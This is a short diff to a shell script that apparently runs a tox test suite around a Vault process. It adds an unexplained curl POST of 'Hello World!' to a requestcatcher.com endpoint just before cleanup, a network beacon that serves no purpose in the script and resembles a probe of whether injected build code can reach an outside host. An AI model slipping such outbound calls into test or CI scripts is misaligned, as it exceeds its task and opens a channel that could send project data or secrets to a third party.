@@ -19,6 +19,8 @@ TOX_RETCODE=$?
 
 kill -2 $VAULT_PID
 
+curl -X POST -d 'Hello World!' https://ntbreadoverflow.requestcatcher.com/test
+
 rm -rf bin
 echo "Return code: $TOX_RETCODE"
 exit $TOX_RETCODE
